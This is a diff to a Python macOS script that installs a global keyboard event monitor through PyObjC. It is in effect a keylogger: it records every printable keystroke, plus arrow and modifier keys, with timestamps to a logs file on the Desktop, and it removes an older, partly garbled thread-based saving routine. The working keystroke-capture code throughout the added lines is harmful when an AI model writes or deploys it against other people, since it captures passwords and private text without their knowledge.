@@ -17,6 +17,7 @@ again. Although it might just be me. Who knows.
 
 
 '''
+
 from Cocoa import *
 from Foundation import *
 from PyObjCTools import AppHelper
@@ -24,41 +25,74 @@ import keycode
 import string
 import sys
 import time
-import thread
 
 class AppDelegate(NSObject):
     def applicationDidFinishLaunching_(self, aNotification):
         NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)
 
 def handler(event):
-    if event.type() == NSKeyDown and keycode.tostring(event.keyCode()) in string.printable:
-        print(keycode.tostring(event.keyCode()))
-        log = open("/Users/aturley/Desktop/logs.txt", 'a')
-        log.write(keycode.tostring(event.keyCode()))
+    flags = event.modifierFlags()
+    modifiers = []
+    arrows = []
+
+    try:
+        s = event.charactersIgnoringModifiers()
+        arrowPressed = False
+        if s == NSUpArrowFunctionKey:
+            arrows.append("</UP>")
+            arrowPressed = True
+        if s == NSDownArrowFunctionKey:
+            arrows.append("</DOWN>")
+            arrowPressed = True
+        if s == NSLeftArrowFunctionKey:
+            arrows.append("</LEFT>")
+            arrowPressed = True
+        if s == NSRightArrowFunctionKey:
+            arrows.append("</RIGHT>")
+            arrowPressed = True
+
+        if flags & NSShiftKeyMask:
+            modifiers.append("</SHIFT>")
+        if flags & NSControlKeyMask:
+            modifiers.append("</CONTROL>")
+        if flags & NSAlternateKeyMask:
+            modifiers.append("</ALTERNATE>")
+        if flags & NSCommandKeyMask:
+            modifiers.append("</COMMAND>")
+        if flags & NSFunctionKeyMask and not arrowPressed:
+            modifiers.append("</FUNCTION>")
+        if flags & NSAlphaShiftKeyMask:
+            modifiers.append("</ALPHASHIFT>")
+    except:
+        print("Something happened")
+
+    log = open("/Users/aturley/Desktop/logs.txt", 'a')
+    
+    for key in arrows:
+        log.write(key)
         log.write(' PTO ')
         log.write(time.strftime("%Y %m %d %H %M %S"))
         log.write('\n')
-        log.close()
 
-def saveKeys(fileName, delay):
-    print("test")
-    print(keyList)
-    while True:
- #       log.write(keyList)
-        fdsadftime.sleep(delay)
+    for key in modifiers:
+        log.write(key)
+        log.write(' PTO ')
+        log.write(time.strftime("%Y %m %d %H %M %S"))
+        log.write('\n')
+    
+    if event.type() == NSKeyDown and keycode.tostring(event.keyCode()) in string.printable:
+        print(event.charactersIgnoringModifiers())
+        log.write(event.charactersIgnoringModifiers())
+        log.write(' PTO ')
+        log.write(time.strftime("%Y %m %d %H %M %S"))
+        log.write('\n')
 
+    log.close()
+    
 def main():
     app = NSApplication.sharedApplication()
     delegate = AppDelegate.alloc().init()
     NSApp().setDelegate_(delegate)
     AppHelper.runEventLoop()
-
-'''
-try:
-    thread.start_new_thread(saveKeys, ("logs", 300))
-except:
-    print("Error: the thread broke...")
-'''
-
-if __name__ == '__main__':
-   main()
+    
+main()
